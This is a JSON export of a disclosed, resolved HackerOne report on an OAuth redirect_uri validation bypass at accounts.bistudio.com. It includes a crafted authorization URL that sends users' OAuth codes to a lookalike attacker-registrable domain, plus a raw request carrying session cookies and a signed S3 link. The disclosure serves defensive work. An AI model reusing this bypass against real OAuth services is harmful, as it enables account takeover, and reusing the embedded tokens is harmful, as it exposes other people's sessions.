@@ -1,0 +1,197 @@
+{
+  "id": 405100,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDUxMDA=",
+  "url": "https://hackerone.com/reports/405100",
+  "title": "Stealing Users OAUTH Tokens via redirect_uri ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-04T10:30:38.885Z",
+  "submitted_at": "2018-09-04T10:30:38.885Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ethancruize",
+    "url": "/ethancruize",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 18362,
+    "url": "https://hackerone.com/bohemia",
+    "handle": "bohemia",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/018/362/cdc81f05eed3c29e276521da9dff6e209f949352_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/018/362/cdc81f05eed3c29e276521da9dff6e209f949352_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "BOHEMIA INTERACTIVE a.s.",
+      "twitter_handle": "bohemiainteract",
+      "website": "http://www.bohemia.net",
+      "about": "Independent developer of video games @arma3official @DayZ @takeonthegame @ylandsgame"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-09-14T12:24:09.249Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-09-07T16:16:18.682Z",
+  "team_member_agreed_on_going_public_at": "2018-09-14T12:24:09.102Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\nI would like to report an Open redirection on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.\n\n**Detail**\n\nDuring the OAUTH flow, the redirect_uri on https://accounts.bistudio.com is not properly validating that the URL given is proper, as such a bypass of filter is possible and hence thereby able to exfiltrate users oauth tokens to that nonexisting domain.\n\nOn clicking on Login on https://xbox.dayz.com an OAUTH request is triggered to accounts.bistudio.com, the endpoint is checking if the Redirect_uri is starting with https://xbox.dayz.com and not checking the ending bits, as such its possible to inject anything after that. \n\nAs an example i injected https://xbox.dayz.comtest.com and the server's whitelist is bypasses and a redirect is performed to https://xbox.dayz.comtest.com with the code and state values.\n\n**Steps to Reproduce**\n\n* Login to any website in the scope \n* After Login access the following URL - \n\n```\nhttps://accounts.bistudio.com/api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3\n```\n* On accessing you will get redirected to **xbox.dayz.comtest.com** with oauth access code and state, registering such domain is possible and when any loggedin user accesses the URL its possible to steal their oauth creds.\n\n\n**RAW Request**\n```\nGET /api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3 HTTP/1.1\nHost: accounts.bistudio.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://incubator.bohemia.net/\nCookie: cookieconsent_dismissed=yes; bi.accounts.connect.sid=s%3AEbOE7LAPYR9IJO8ocyKuhNoIx_qXNt7_.UWaqiLeZPbgCSPM5nTvWUY2HiRYUXzEjw%2BRPxP3optA; bi_store_auth_session=eyJpdiI6IkcxSWloOVwvdngyaVFjZE9WM012ZzZMRmpkY1VnN1wvOW5abnkyYlNBVklaMD0iLCJ2YWx1ZSI6IjRpUFRUNzFkNElkWkZWeUc4U2o1TkNBaytURlJnVEVyaVFlMTJEc1pjcFR6XC9wUjlHdjd2cDRNQXFaN3hlZjVodHFMaW84WVFxWVJvUG1DOE4xTmtqUT09IiwibWFjIjoiZmRkZThlYjliMmZhMjc4YzBhMWVjMThkN2UxOTc5NmY3MjQ1YTc0NGFlY2FmNGVlNDUwOTU4ZjZmMGU5YTMwMSJ9\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n\n## Impact\n\nDue to validation bypass in redirect_uri parameter in OAUTH flow, its possible to redirect authenticated users to arbitrary domains with their oauth credentials from which its possible to takeover their account.\n\nBest Regards,\nEC",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 342187,
+      "file_name": "oauth.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/342/187/33014f2018adc6e6e1a7eba7f270711ea701baa2/oauth.PNG?response-content-disposition=attachment%3B%20filename%3D%22oauth.PNG%22%3B%20filename%2A%3DUTF-8%27%27oauth.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV327SCJW%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T060101Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICcmLPAsz8aIJBxwFQKJqnVeDfAfWOdxk1IngSaMmeJzAiBKDG4l1%2Br3ISKFshX%2BkxPWdzB9VV7nQD5%2BwDSV08JosyqyBQh%2BEAMaDDAxMzYxOTI3NDg0OSIMk8nxC%2BTbLzjFAmp7Ko8FLPhdrVD4E2hhdx1Zb0Avw%2BCjLB4pldVIwFlS5yJrI%2FsMNqcGTSEsfN2z3npfnk5b41VkUd%2FFa%2BkaeCb1LFnYA7stTGDdTjV6yGnCvkfkYVBX8EAryen9284xVWqXeGHUmxxFI0gcd1xkdz4jJ12tYTbIwYDZYMVfOvsKWyzropj951clyEpv4fAeC1aqQY0NhqL2v%2FbWltEsawextFCV8SYQ62%2FLYIbbs1cauBq9sq3T2sWieTbDLsF8Omj1JnhqtMrsLqQHEdW7tre8R8f3PnDmYYjp5dOT7FS9yn6SSlyR8xqBvLLcGkCVa3lGp5E7SCc0gwJmQn5uxwgKQFuttvoFNo4a32Y%2BoExmqYS%2BFqUTtSRNE78FkN6khA5P4cVMYZWZfzETe5fg%2BzxUlm1wFTvyk6%2BNj17PTLh7F0Vt%2BTGiWNbUhDigUrSN2J1vU4DE3xTXc6ptkF5SQ58TTjHuzn1YZQv0dFvVzD12llG%2BUV1yE5saysqs5hdHyhS1HYiW%2Bof7oc3f5UG1awtxuVkVSp8pghtff1ZJYsAVDVTpBz%2BNno3y7RWsGWOLWKv%2B725EeW8X%2FCZ2Kwvq5XXNfFAYR8apF6HSpD7lEF2jT2%2B3SR2tlzwvX9xeLIbx1jEIiUjQFu2v7gxrkrkWcW3zdxJyqXT9WIisUx1gW0%2BARkC4vhl20H9Sd%2FPKalUv038Zad6BQ1WlNeQVe5j7OdmLxKvde6WfXedzvfZiWKBQNqPpPCjGoah0uXJqNBk2mHXJUj9n8%2FWgKah8apydmmnw2cg0k0tJO0HPWrSEbsDRJmxdCp0Kio5DLk%2B6t0eCP%2Bjvh6Gtaj5Yrk5uljEmhYKquzO51DpIKMs%2BskP3yHYGh8nsqjCKu7fSBjqyAT%2BOiaQSm12aJgcXkAfQB7ruWGzRbpU%2BgUFcUEnKAVAP%2FMojoxKMSYGyfUKghv%2F7n2F51f3XiUQqaiR8wFfdnrNGwRPQWWkNLMj%2F1bcYHmV1AS61piZp5M0yp2PSXyMqWaJXEPzNBF%2Fi9h8gQhG2jSDVyg8lBwqggatsLYEmxlPbUKcUx9B2giy1fY8qnQTMr1kI%2FNhE0UJgZErpIgRIqE3e5ZMxdZSMvo4xqCBV1dQrSVY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c0fb937162000728beb7af9f9d5e93c56d70b8979020f74ae0536de3696de400",
+      "file_size": 11555,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-10-07T16:16:18.801Z",
+  "allow_singular_disclosure_after": -244561483.18257415,
+  "singular_disclosure_allowed": true,
+  "vote_count": 44,
+  "voters": [
+    "he4am",
+    "loaymorad",
+    "ayman3os",
+    "ali",
+    "sameerphad72",
+    "vinnyvinoth",
+    "miguel_santareno",
+    "mik317",
+    "savitar0x01",
+    "apapedulimu",
+    "and 34 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 5853,
+    "asset_type": "OTHER",
+    "asset_identifier": "Domain listed in the policy scope",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "405100",
+  "votes": 44,
+  "latest_disclosable_activity_at": "2018-09-14T12:24:09.283Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:01:02.118814",
+    "source": "https://hackerone.com/reports/405100.json",
+    "report_id": 405100
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDUxMDA=",
+    "databaseId": "405100",
+    "title": "Stealing Users OAUTH Tokens via redirect_uri ",
+    "url": "https://hackerone.com/reports/405100",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2018-09-14T12:24:09.249Z",
+    "created_at": "2018-09-04T10:30:38.885Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI3",
+      "name": "Improper Authentication - Generic",
+      "external_id": "cwe-287"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "ethancruize"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE4MzYy",
+      "handle": "bohemia",
+      "name": "BOHEMIA INTERACTIVE a.s.",
+      "url": "https://hackerone.com/bohemia",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzQwNTEwMA==",
+    "_id": "405100",
+    "disclosed": true,
+    "votes": 44,
+    "latest_disclosable_activity_at": "2018-09-14T12:24:09.283Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDUxMDA=",
+      "databaseId": "405100",
+      "title": "Stealing Users OAUTH Tokens via redirect_uri ",
+      "url": "https://hackerone.com/reports/405100",
+      "disclosed_at": "2018-09-14T12:24:09.249Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE4MzYy",
+      "handle": "bohemia",
+      "name": "BOHEMIA INTERACTIVE a.s.",
+      "url": "https://hackerone.com/bohemia",
+      "currency": "usd"
+    }
+  }
+}
